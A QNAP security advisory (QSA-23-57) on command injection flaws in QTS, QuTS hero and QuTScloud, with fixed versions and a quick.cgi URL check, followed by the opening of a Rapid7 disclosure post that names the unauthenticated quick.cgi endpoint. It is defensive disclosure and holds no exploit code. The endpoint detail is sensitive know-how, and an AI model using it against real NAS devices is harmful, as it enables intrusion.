* [Technical Specifications](https://view.publitas.com/qnap-1/qvr_face_tech_specs_20200831/page/1)

KoiMeeter

#### KoiMeeter

QNAP smart video solutions provides integrated intelligent packages such as video conferencing and smart retail, boosting productivity for individuals and businesses.

##### Video Conferencing

* [KoiMeeter](/go/solution/koimeeter-2/)

##### Smart Retail

* [KoiRetail](/go/software/koiretail)

Solution

* ###### Enterprise

  + [Immutable Storage](/go/solution/immutable-storage)
  + [All-Flash Storage](/go/solution/all-flash/)
  + [Petabyte-Scale Storage](/go/solution/petabyte-storage/)
  + [AI Storage](/go/solution/optimize-ai-with-qnap-storage/)
  + [FC-SAN Storage](/go/solution/fibrechannel-san/)
  + [High Availability Storage](/go/product/es2486dc)
  + [Cold Data Storage](/go/solution/blueglacier/)
  + [View All](/go/solution/enterprise/)
* ###### Business

  + [Why ZFS Storage?](/go/solution/qnap-zfs/)
  + [Disaster Recovery](/go/solution/zfs-snapsync/)
  + [Storage for Virtualization](/go/solution/virtualization)
  + [Run VMs on NAS](/go/software/virtualization-station)
  + [10GbE Solutions](/go/solution/high-speed-connectivity/)
  + [25GbE Solutions](/go/solution/25gb-solution/)
  + [SMB 3.0 Multichannel](/go/solution/smb-multichannel/)
  + [SSD Cache Acceleration](/go/solution/ssd-cache/)
  + [Manage Multiple NAS](/go/software/amiz-cloud)
  + [Drive Health Prediction](/go/software/da-drive-analyzer)
  + [View All](/go/solution/business-applications/)
* ###### Backup & Recovery

  + [Backup Overview](/go/solution/backup-and-restoration/)
  + [NAS Backup](/go/software/hybrid-backup-sync)
  + [Airgap+ Backup](/go/solution/airgap-plus)
  + [PC/Server Backup](/go/software/netbak-pc-agent)
  + [SaaS Backup](/go/solution/boxafe/)
  + [VM Backup](/go/software/hyper-data-protector)
  + [Veeam-Ready Backup](/go/solution/veeam-ready/)
  + [RAID](/go/solution/raid-management/)
  + [Snapshots & Versioning](/go/solution/snapshots/)
  + [Email Backup](/go/software/qmailagent)
  + [View All](/go/solution/data-protection/)
* ###### Personal and Family

  + [What is NAS?](/go/solution/what-is-nas/)
  + [2.5GbE NAS](/go/solution/2.5g/)
  + [Anywhere File Access](/go/software/myqnapcloud/)
  + [Personal Backup](/go/solution/personal-backup/)
  + [No Data Loss](/go/solution/home-snapshots/)
  + [File Synchronization](/go/software/qsync)
  + [Smart Photo Albums](/go/software/qumagie)
  + [Video Streaming](/go/software/video-station)
  + [AI-powered File Search](/go/software/qsirch)
  + [Best Plex NAS](/go/solution/plex-best-nas/)
  + [View All](/go/solution/homeusers)
* ###### Cloud

  + [myQNAPcloud Storage](/go/solution/myqnapcloud-storage/)
  + [Cloud Mounting](/go/software/hybridmount)
  + [QuTScloud Cloud NAS](/go/solution/qutscloud-overview/)
  + [Backup to ElephantDrive](/go/solution/elephantdrive/)
  + [AWS Storage Gateway](/go/solution/aws-storage-gateway/)
  + [View All](/go/solution/cloud)
* ###### Networking

  + [Switch Overview](/go/solution/network-switches/)
  + [NDR Switches](/go/solution/network-security/)
  + [Smart Edge Switches](/go/solution/guardian/)
  + [Mesh VPN](/go/solution/quwan-sd-wan/)
  + [VPN Servers & Clients](/go/software/qvpn-service)
  + [pfSense Firewall](/go/solution/pfsense/)
  + [Virtual Router](/go/software/quwan-vrouter-edition)
  + [VNF Platform](/go/solution/qne-software-defined-platform/)
  + [View All](/go/solution/networking-overview)
* ###### Surveillance

  + [Surveillance Overview](/go/solution/qvr-surveillance/)
  + [Active Backup for Surveillance](/go/software/qvr-recording-vault)
  + [Surveillance Client Software](/go/software/qvr-pro-client)
  + [Smart Search](/go/software/qvr-smart-search)
  + [Face Recognition](/go/solution/qvr-face/)
  + [Door Access](/go/software/qvr-dooraccess)
  + [People Counting](/go/software/qvr-human)
  + [Central Management System](/go/software/qvr-center)
  + [Support Milestone Platform](/go/solution/surveillance-milestone/)
  + [QVR Developer Center](/go/solution/qvr-developer/)
  + [View All](/go/solution/surveillance-smartvideo/)
* ###### Product Security

  + [Secure Storage](/go/solution/secure-storage)
  + [NAS Security Guide](/go/security)
  + [Anti-ransomware](/go/solution/ransomware/)
  + [Multi-factor Authentication](/go/solution/authentication/%20)
  + [Security Center](/go/software/security-center)
  + [Malware Remover](/go/software/malware-remover)
  + [QuFirewall](/go/software/qufirewall)
  + [VPN Servers & Clients](/go/software/qvpn-service)
  + [McAfee Antivirus](/go/software/mcafee-antivirus)
  + [View All](/go/solution/product-security/)
* ###### Content Creation

  + [Content Creators](/go/solution/content-creator/)
  + [Photography](/go/solution/photo-storage/)
  + [Post-Production](/go/solution/video-storage/)
  + [Thunderbolt™ Solution](/go/solution/thunderbolt-total-solution/)
  + [Adobe Users](/go/solution/adobe/)
  + [Apple Users](/go/solution/apple-users/)
  + [Direct-Attached Storage](/go/solution/das-for-pc/)
  + [exFAT Large File Transfer](/go/software/exfat)
  + [View All](/go/solution/content-creation)

Support

* ###### Help

  + [Knowledge Base](/go/how-to)
  + [QTS Manual](/go/doc/qts)
  + [QuTS hero Manual](/go/doc/quts-hero)
  + [QES Manual](/go/doc/qes)
  + [QNE Network Manual](/go/doc/qne-network)
  + [Video Tutorials](/go/qutube)
  + [Contact Sales](/go/inquiry/sales-inquiry)
* ###### Download

  + [OS & User Guide](/go/download)
  + [App Center](/go/app_center/)
  + [Mobile Apps](/go/mobile-apps)
  + [Desktop Utilities](/go/utilities)
* ###### Product Security

  + [Security Overview](/go/security)
  + [Security Advisories and Updates](/go/security-advisories)
  + [Report a Vulnerability](/go/security-advisories#sa-report)
  + [Information Security Manual](https://view.publitas.com/qnap-1/2022_security_guide_en/)
  + [Product Security News](/go/security-news/)
  + [Security Bounty Program](/go/security-bounty-program)
* ###### Compatibility List

  + [Drives & Peripherals](/go/compatibility/)
  + [Storage Expansion Enclosures](/go/compatibility-expansion)
  + [QVR Elite Cameras](/go/compatibility-camera/)
  + [QVR Pro Cameras](/go/compatibility-qvr-pro)
  + [Surveillance Station Cameras](/go/compatibility-surveillance/)
  + [Move Drives to Another QNAP NAS](/go/nas-migration/)
* ###### Technical Support & Repair

  + [Contact Technical Support](https://service.qnap.com/en)
  + [Check Standard Warranty](/go/service/product-warranty/#f01)
  + [Buy Extended Warranty](/go/service/product-warranty/#f02)
  + [Out-of-Warranty Repair](/go/rma-service/)
  + [Check Repair Status](/go/rma/)
  + [Check Product Support Status](/go/product/eol.php)
* ###### Resources

  + [Operating System Release Notes](/go/release-notes/)
  + [NAS Selector](/go/selector/nas-selector)
  + [RAID Calculator](/go/selector/raid-selector)
  + [Customer Stories](/go/customer-stories)
  + [White Papers](/go/white-paper)
  + [Become QNAP Developer Partners](/go/developer/)
  + [Blog](https://blog.qnap.com/)
  + [Facebook](https://www.facebook.com/QNAPSys)
  + [Instagram](https://www.instagram.com/qnap_official/)
  + [YouTube](https://www.youtube.com/channel/UCoRW41xIvQXqUW4B4QCqPgg)
  + [Twitter](https://twitter.com/qnap_nas)
  + [Technical Advisories](/go/technical-advisory)

Where To Buy

* ###### Buy from QNAP

  + [Buy Licenses](https://software.qnap.com/)
  + [Buy Extended Warranty](/go/service/product-warranty/#f02)
  + [Buy Accessories](/go/accessory-store)
* ###### Global Distributors

  + [Where to buy](/go/where-to-buy/)

About Us

* ###### About Us

  + [About QNAP](/go/about-qnap)
  + [Newsroom](/go/news/)
  + [Awards & Reviews](/go/media-coverage)
  + [Blog](https://blog.qnap.com/)
  + [Contact Us](/go/contact-us/)
  + [Subscribe](/go/solution/topics-of-interest)
  + [Join QNAP](/go/career)
* ###### Legal

  + [Terms of Use](/go/before_buy/con_show.php?op=showone&cid=14)
  + [Privacy Notice](/go/before_buy/con_show.php?op=showone&cid=17)

![Search](https://www.qnap.com/assets/img/header/search.svg)
×

Security ID : QSA-23-57

# Multiple Vulnerabilities in QTS, QuTS hero and QuTScloud

---

* Release date : February 13, 2024
* CVE identifier : CVE-2023-47218 | CVE-2023-50358
* Affected products: QTS 5.x, 4.x; QuTS hero h5.x, h4.x, QuTScloud 5.x

![](/assets/img/security-advisory/severity-moderate.svg)

Severity

#### Moderate

![](/assets/img/security-advisory/status-resolved.svg)

Status

#### Resolved

---

### Summary

Multiple vulnerabilities have been reported to affect several QNAP operating system versions. If exploited, the OS command injection vulnerabilities could allow users to execute commands via a network.

We have already fixed the vulnerabilities in the following versions.

To fully fix the vulnerabilities, you must install one of the fully fixed versions.

If you do not want to install a fully fixed version for your device, you can still mitigate the vulnerabilities by installing a partially fixed version. However, note that the vulnerabilities still exist during the installation process of a partially fixed version. The vulnerabilities only disappear after installation is complete.

| Affected Product | Severity | Partially Fixed Version | Fully Fixed Version |
| --- | --- | --- | --- |
| QTS 5.1.x | Medium | QTS 5.1.0.2444 build 20230629 and later | QTS 5.1.5.2645 build 20240116 and later |
| QTS 5.0.1 | Medium | QTS 5.0.1.2145 build 20220903 and later | QTS 5.1.5.2645 build 20240116 and later |
| QTS 5.0.0 | High | QTS 5.0.0.1986 build 20220324 and later | QTS 5.1.5.2645 build 20240116 and later |
| QTS 4.5.x, 4,4,x | High | QTS 4.5.4.2012 build 20220419 and later | QTS 4.5.4.2627 build 20231225 and later |
| QTS 4.3.6, 4.3.5 | High | QTS 4.3.6.2665 build 20240131 and later | QTS 4.3.6.2665 build 20240131 and later |
| QTS 4.3.4 | High | QTS 4.3.4.2675 build 20240131 and later | QTS 4.3.4.2675 build 20240131 and later |
| QTS 4.3.x | High | QTS 4.3.3.2644 build 20240131 and later | QTS 4.3.3.2644 build 20240131 and later |
| QTS 4.2.x | High | QTS 4.2.6 build 20240131 and later | QTS 4.2.6 build 20240131 and later |
| QuTS hero h5.1.x | Medium | QuTS hero h5.1.0.2466 build 20230721 and later | QuTS hero h5.1.5.2647 build 20240118 and later |
| QuTS hero h5.0.1 | Medium | QuTS hero h5.0.1.2192 build 20221020 and later | QuTS hero h5.1.5.2647 build 20240118 and later |
| QuTS hero h5.0.0 | High | QuTS hero h5.0.0.1986 build 20220324 and later | QuTS hero h5.1.5.2647 build 20240118 and later |
| QuTS hero h4.x | High | QuTS hero h4.5.4.1991 build 20220330 and later | QuTS hero h4.5.4.2626 build 20231225 and later |
| QuTScloud c5.x | High | QuTScloud c5.1.5.2651 and later | QuTScloud c5.1.5.2651 and later |

### Recommendation

To secure your device, we recommend regularly updating your system to the latest version to benefit from vulnerability fixes. You can check the [product support status](https://www.qnap.com/en/product/eol.php) to see the latest updates available to your NAS model.

### Mitigation

If you do not want to update your operating system to the latest version, you can perform the following actions to mitigate the vulnerabilities.

1. Test the following URL in your browser:

        https://<NAS IP address>:<NAS system port>/cgi-bin/quick/quick.cgi
   * If you get the following response (HTTP 404 error), your system is not vulnerable:

          "Page not found or the web server is currently unavailable. Please contact the website administrator for help."
   * If you get an empty page (HTTP 200), continue to the next step.
2. Update your operating system to one of the following versions or later:
   * QTS 5.1.0.2444 build 20230629 and later
   * QTS 5.0.1.2145 build 20220903 and later
   * QTS 5.0.0.1986 build 20220324 and later
   * QTS 4.5.4.2012 build 20220419 and later
   * QTS 4.3.6.2665 build 20240131 and later
   * QTS 4.3.4.2675 build 20240131 and later
   * QTS 4.3.3.2644 build 20240131 and later
   * QTS 4.2.6 build 20240131 and later
   * QuTS hero h5.1.0.2466 build 20230721 and later
   * QuTS hero h5.0.1.2192 build 20221020 and later
   * QuTS hero h5.0.0.1986 build 20220324 and later
   * QuTS hero h4.5.4.1991 build 20220330 and later
3. Test the above URL again in your browser.
   * If you get the following response (HTTP 404 error), your system is now free from the vulnerabilities:

          "Page not found or the web server is currently unavailable. Please contact the website administrator for help."
   * If you get an empty page (HTTP 200), please update firmware immediately.

### Updating QTS, QuTS hero, or QuTScloud

1. Log in to QTS, QuTS hero, or QuTScloud as an administrator.
2. Go to **Control Panel** > **System** >**Firmware Update**.
3. Under **Live Update**, click **Check for Update**.

   The system downloads and installs the latest available update.

**Tip:**You can also download the update from the QNAP website. Go to **Support** >**Download Center** and then perform a manual update for your specific device.

**Attachment**

* [CVE-2023-47218.json](/uploads/security-advisories/QSA-23-57/CVE-2023-47218.json)
* [CVE-2023-50358.json](/uploads/security-advisories/QSA-23-57/CVE-2023-50358.json)

**Acknowledgements:**
Stephen Fewer, Principal Security Researcher at Rapid7
Palo Alto Networks Unit 42

**Revision History:**
V1.0 (February 13, 2024) - Published

####

List price

Choose specification

Show more
Less

* Get to know us
  + [About QNAP](https://www.qnap.com/go/about-qnap)
  + [Technical Partners](https://www.qnap.com/go/partner/)
  + [Newsroom](https://www.qnap.com/go/news/)
  + [Career](https://www.qnap.com/go/career)
  + [Contact QNAP](https://www.qnap.com/go/contact-us/)
* Other QNAP websites
  + [QNAP software store](https://www.qnap.com/go/software-store?ref=footer)
  + [Accessories Store](https://www.qnap.com/go/accessory-store)
  + [myQNAPcloud](https://www.qnap.com/go/software/myqnapcloud)
  + [IEI Products](https://www.qnap.com/go/iei-products/)
* Support
  + [Customer Service](https://service.qnap.com/)
  + [Knowledge Base](https://www.qnap.com/go/how-to)
  + [Security Advisory](https://www.qnap.com/go/security-advisories)
  + [Warranty Terms and Conditions](https://www.qnap.com/go/service/product-warranty/#popup-terms1)
  + [QNAP RMA Service](https://www.qnap.com/go/rma-service)
  + [Out-of-Warranty RMA Service Terms and Conditions](https://www.qnap.com/go/before_buy/con_show.php?op=showone&cid=26)
  + [Technical Support](https://service.qnap.com/en)
  + [Surveillance NAS Selector](https://www.qnap.com/go/qvr-nas-selector/)
* Resources
  + [Download Center](https://www.qnap.com/go/download)
  + [Product Support Status](https://www.qnap.com/go/product/eol.php)
  + [QNAP Community](https://www.qnap.com/go/before_group/list.php?cat=1)
  + [GPL Source](https://sourceforge.net/projects/qosgpl/)
  + [Developers](https://www.qnap.com/go/developer/)
  + [Cloud Service](https://www.qnap.com/go/solution/cloud-service-portal/)
  + [QNAP Blog](https://blog.qnap.com/)
  + [QuTube](https://www.qnap.com/go/qutube/)
* Connect with us
  + [![Facebook](/assets/img/footer/s-facebook.svg?v=1651542122)](https://www.facebook.com/QNAPSys/)
  + [![Twitter](/assets/img/footer/s-twitter.svg?v=1701829106)](https://twitter.com/qnap_nas)
  + [![Youtube](/assets/img/footer/s-youtube.svg?v=1651542122)](https://www.youtube.com/channel/UCoRW41xIvQXqUW4B4QCqPgg)
  + [![Instagram](/assets/img/footer/s-instagram.svg?v=1651542122)](https://www.instagram.com/qnap_official/)

  [Subscribe Newsletter](/go/solution/topics-of-interest)

Copyright ©2025 QNAP Systems, Inc. All Rights Reserved.

* [Privacy Policy](https://www.qnap.com/go/before_buy/con_show.php?op=showone&cid=17)
* [Terms of Use](https://www.qnap.com/go/before_buy/con_show.php?op=showone&cid=14)
* [Information Security Policy](https://www.qnap.com/go/about/con_show.php?op=showone&cid=4)

![Change Language](/assets/img/footer/globe.svg?v=1)

×
### Choose Your Country or Region

* #### Asia

  + [**ASEAN**
    / English](https://www.qnap.com/en-as/security-advisory/qsa-23-57)
  + [**Australia**
    / English](https://www.qnap.com/en-au/security-advisory/qsa-23-57)
  + [**中国**
    / 简体中文](https://www.qnap.com.cn/zh-cn/security-advisory/qsa-23-57)
  + [**香港特別行政區**
    / 繁體中文](https://www.qnap.com/zh-hk/security-advisory/qsa-23-57)
  + [**India**
    / English](https://www.qnap.com/en-in/security-advisory/qsa-23-57)
  + [**日本**
    / 日本語](https://www.qnap.com/ja-jp/security-advisory/qsa-23-57)
  + [**대한민국**
    / 한국어](https://www.qnap.com/ko-kr/security-advisory/qsa-23-57)
  + [**Middle East**
    / English](https://www.qnap.com/en-me/security-advisory/qsa-23-57)
  + [**台灣**
    / 繁體中文](https://www.qnap.com/zh-tw/security-advisory/qsa-23-57)
  + [**ไทย**
    / ไทย](https://www.qnap.com/th-th/security-advisory/qsa-23-57)
  + [**Việt Nam**
    / Tiếng Việt](https://www.qnap.com/vi-vn/security-advisory/qsa-23-57)
* #### Europe

  + [**Česká Republika**
    / Čeština](https://www.qnap.com/cs-cz/security-advisory/qsa-23-57)
  + [**Danmark**
    / Dansk](https://www.qnap.com/da-dk/security-advisory/qsa-23-57)
  + [**France**
    / Français](https://www.qnap.com/fr-fr/security-advisory/qsa-23-57)
  + [**Deutschland**
    / Deutsch](https://www.qnap.com/de-de/security-advisory/qsa-23-57)
  + [**Magyarország**
    / Magyar](https://www.qnap.com/hu-hu/security-advisory/qsa-23-57)
  + [**Italia**
    / Italiano](https://www.qnap.com/it-it/security-advisory/qsa-23-57)
  + [**Nederland**
    / Nederlands](https://www.qnap.com/nl-nl/security-advisory/qsa-23-57)
  + [**Polska**
    / Polski](https://www.qnap.com/pl-pl/security-advisory/qsa-23-57)
  + [**Portugal**
    / Português](https://www.qnap.com/pt-pt/security-advisory/qsa-23-57)
  + [**España**
    / Español](https://www.qnap.com/es-es/security-advisory/qsa-23-57)
  + [**Sverige**
    / Svenska](https://www.qnap.com/sv-se/security-advisory/qsa-23-57)
  + [**Türkiye**
    / Türkçe](https://www.qnap.com/tr-tr/security-advisory/qsa-23-57)
  + [**United Kingdom**
    / English](https://www.qnap.com/en-uk/security-advisory/qsa-23-57)
* #### America

  + [**América Latina**
    / Español](https://www.qnap.com/la/security-advisory/qsa-23-57)
  + [**Brasil**
    / Português](https://www.qnap.com/pt-br/security-advisory/qsa-23-57)
  + [**Canada**
    / English](https://www.qnap.com/en-us/security-advisory/qsa-23-57)
  + [**United States**
    / English](https://www.qnap.com/en-us/security-advisory/qsa-23-57)
* #### Global

  + [**Global**
    / English](https://www.qnap.com/en/security-advisory/qsa-23-57)

* [![](https://www.qnap.com/uploads/images/footer/qutscloud-demo-site.svg)](https://www.qnap.com/go/live-demo)
* [![](https://www.qnap.com/uploads/images/footer/qutube.svg)](https://www.youtube.com/%40qnapsys)
* [![](https://www.qnap.com/uploads/images/footer/qnap-raid-calculator.svg)](https://www.qnap.com/go/nas-selector)

![open menu](/assets/img/icon/common-menu/light-bulb.svg?v=f59f8a49658dea34ec0219a230fa6e1f)

![back to top](/assets/img/icon/common-menu/roll-to-top.svg?v=f59f8a49658dea34ec0219a230fa6e1f)

Hello ,

Welcome! You can start using a variety of QNAP member services.

* [![](https://www.qnap.com/assets/img/footer/login/license_store.png)

  Software Store

  Get licenses for advanced features from our Software Store.](https://account.qnap.com/oauth/auth?lang=en&response_type=code&client_id=5d77080ed6b82f062b138be7&redirect_uri=https%3A%2F%2Fsoftware.qnap.com%2Freceive_auth&state=lang%3Den)
* [![](https://www.qnap.com/assets/img/footer/login/warranty.png)

  Warranty

  If you need a longer warranty, you can purchase QNAP Extended Warranty Service (QEWS) for additional coverage.](https://account.qnap.com/oauth/auth?lang=en&response_type=code&client_id=5b8e2d66d6b82f0a86def499&redirect_uri=https%3A%2F%2Fsoftware.qnap.com%2Fows%2Freceive_auth&state=lang%3Den)
* [![](https://www.qnap.com/assets/img/footer/login/customer_portal.png)

  Service Portal

  If you have any further questions about QNAP products or solutions, contact customer service through the Service Portal.](https://account.qnap.com/oauth/auth?response_type=code&client_id=5d01a9afd6b82f288eb761d8&redirect_uri=https%3A%2F%2Fservice.qnap.com%2Foauth%2Fqcloud-back&state=en/home&lang=en)

×



=== Content from www.rapid7.com_d9a85d77_20250114_191452.html ===


[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)
* en
  + English
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg) Sign In](https://insight.rapid7.com/saml/SSO)
[Blog](/blog/ "Blog")

* Select
  + [Vulnerability Management](/blog/tag/vulnerability-management/)
  + [MDR](/blog/tag/mdr-managed-detection-response/)
  + [Detection & Response](/blog/tag/detection-and-response/)
  + [Cloud Security](/blog/tag/cloud-security/)
  + [App Security](/blog/tag/application-security/)
  + [Metasploit](/blog/tag/metasploit/)
  + [All Topics](/blog/tags/)

[Start Trial](/trial/insight/)[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)

* en
  + English
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg)Sign In](https://insight.rapid7.com/saml/SSO)
[![Rapid7 logo](/Areas/Docs/includes/img/r7-nav/Rapid7_logo-short.svg)](https://www.rapid7.com/)

* [Blog](/blog/ "Blog")
* [Vulnerability Management](/blog/tag/vulnerability-management/)
* [MDR](/blog/tag/mdr-managed-detection-response/)
* [Detection & Response](/blog/tag/detection-and-response/)
* [Cloud Security](/blog/tag/cloud-security/)
* [App Security](/blog/tag/application-security/)
* [Metasploit](/blog/tag/metasploit/)
* [All Topics](/blog/tags/)
[Start Trial](/trial/insight/)

# CVE-2023-47218: QNAP QTS and QuTS Hero Unauthenticated Command Injection (FIXED)

* Feb 13, 2024
* 11 min read
* [Stephen Fewer](/blog/author/sfewer-r7/)

*Last updated at Tue, 13 Feb 2024 16:00:00 GMT*

Rapid7 has identified an unauthenticated command injection vulnerability in the QNAP operating system known as [QTS](https://www.qnap.com/qts/5.1.0/en-us/) and [QuTS hero](https://www.qnap.com/en/operating-system/quts-hero/5.1.0). QTS is a core part of the firmware for numerous QNAP entry- and mid-level Network Attached Storage (NAS) devices, and QuTS hero is a core part of the firmware for numerous QNAP high-end and enterprise NAS devices. The vulnerable endpoint is the `quick.cgi` component, exposed by the device’s web based administration feature. The `quick.cgi` component is present in an uninitialized QNAP NAS device. This component is intended to be used during either manual or cloud based provisioning of a QNAP NAS device. Once a device has been successfully initialized, the `quick.cgi` component is disabled on the system.

An attacker with network access to an uninitialized QNAP NAS device may perform unauthenticated command injection, allowing the attacker to execute arbitrary commands on the device.

## Credit

This vulnerability was discovered by Stephen Fewer, Principal Security Researcher at Rapid7 and is being disclosed in accordance with Rapid7’s [vulnerability disclosure policy](https://www.rapid7.com/disclosure/).

## Vendor Statement

